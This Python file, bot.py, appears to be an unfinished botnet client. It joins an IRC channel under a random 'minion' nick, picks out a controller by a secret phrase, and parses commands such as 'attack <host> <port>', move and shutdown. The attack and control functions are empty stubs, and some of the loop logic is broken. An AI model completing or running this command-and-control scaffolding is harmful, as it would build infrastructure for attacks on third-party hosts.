#bot.py
import sys
import random
import socket
import string
import time
import re

# Function to get a nick with a high probability of being unique by using randomness
def getNick():
    rootOfName = "minion"
    candidateTail = ""
    for _ in range(4):
        candidateTail = candidateTail + str(random.choice(string.ascii_letters + string.digits))
    return (rootOfName + candidateTail)

# Function to connect to IRC server and send NICK and USER messages
# Will also join CHANNEL if it exist and create it if it doesnt
def connectToIRC():
    global IRCconnection
    global nick
    try:
        print("Starting IRC server connection...")
        IRCconnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)       # Create socket for TCP connection to IRC channet
        IRCconnection.connect((HOSTNAME,PORT))                                  # Connect to cmd line specified host and port
        print("Connected to IRC server at " + HOSTNAME)
        nickSet = False
        while(nickSet == False):
            candidateNick = getNick()
            NICK_Msg = "NICK " + candidateNick +"\r\n"                          # Construct NICK message
            USER_Msg = "USER " + candidateNick + " * * :Not Yourconsern\r\n"    # Construct USER message
            IRCconnection.sendall(NICK_Msg.encode("utf-8"))                     # Send NICK message
            IRCconnection.sendall(USER_Msg.encode("utf-8"))
            NICK_Response = IRCconnection.recv(512)                             # Recieve NICK response of 512 characters max for IRC protocol
            print(NICK_Response.decode("utf-8"))
            NICK_Response = NICK_Response.split()
            if((NICK_Response[1]).decode("utf-8") == "001"):
                nick = candidateNick                                            # If nick is not in use already, set global nick variable
                nickSet = True                                                  # Change nickSet flag to true
                joinChannel(CHANNEL)
    except Exception as e:
        print("Error: " + str(e))
        time.sleep(5)

def joinChannel(chann):
    joinMessage = "JOIN #" + chann + "\r\n"
    IRCconnection.sendall(joinMessage.encode("utf-8"))
    response = IRCconnection.recv(512)
    print(response.decode("utf-8"))

# Function that monitors IRC message traffic to find messages containing the keyword
def listen():
    global controllerNick
    try:
        while(True):
            ircmessage = IRCconnection.recv(512)
            ircmessage = ircmessage.decode("utf-8")
            print("received: " + ircmessage)
            splitmessage = ircmessage.split()
            if(ircmessage.isspace()):
                IRCconnection.close()
                main()                                                          # Server trying to kick -
            if((len(splitmessage) > 0) & (splitmessage[0] == "PING")):          # Prevent inactive connection from closing
                IRCconnection.sendall(b'PONG\r\n')
                print("sent: PONG")
            elif (SECRET_PHRASE in splitmessage):                               # Detect use of SECRET_PHRASE as message in CHANNEL
                print("secret phrase detected")                                 #TODO: what is sufficient proof of the secret phrase?
                controllerNick = (splitmessage[0].split("!")[0])[1:]            # Get nick of user who sent secret phrase as stand alone message
                print("controller nick is: " + controllerNick)
            else:
                print("in else")
    except Exception as e:
        print("Error: " + str(e))
        return

def getCommand():
    attack = re.compile('attack\s(\S+\.?\S+)+\s\d+')
    move = re.compile('move\s(\S+\.?\S+)+\s\d+')
    gettingCmdFlag = True
    try:
        print("Connected to channel: " + CHANNEL)
        cmd = input("Enter a command: ")
        while gettingCmdFlag:
            if cmd.lower() == "status":
                pass
            elif attack.match(cmd):
                pass
            elif move.match(cmd):
                pass
            elif cmd.lower() == "quit":
                pass
            elif cmd.lower() == "shutdown":
                pass
            else:
                print("Command " + cmd + " not valid.")
                cmd = input("Enter a command: ")
    except Exception as e:
        print("Error: " + str(e))
        return

'''
def getStatus():

def doAttack():

def moveServer():

def quit():

def shutdown():
'''

def main():
    global HOSTNAME
    global PORT
    global CHANNEL
    global SECRET_PHRASE                                                        # Secret code word that IRC bot will listen for to ID controller
    global shutdownFlag                                                         # Will only be true when controller issues 'shutdown' command

    if len(sys.argv) == 5:
        HOSTNAME = str(sys.argv[1])
        PORT = int(sys.argv[2])
        CHANNEL = str(sys.argv[3])
        SECRET_PHRASE = ":" + str(sys.argv[4])
        shutdownFlag = False                                                    # Bot will try to connect to HOSTNAME:PORT every 5 seconds unless this is set to True
        while(not shutdownFlag):
            connectToIRC()
            getCommand()
            #listen()
            time.sleep(5)                                                       # Wait 5 seconds before attempting to reconnect

    else:
        print("Error: wrong command line arguments", file = sys.stderr)

if __name__ == "__main__":
    main()
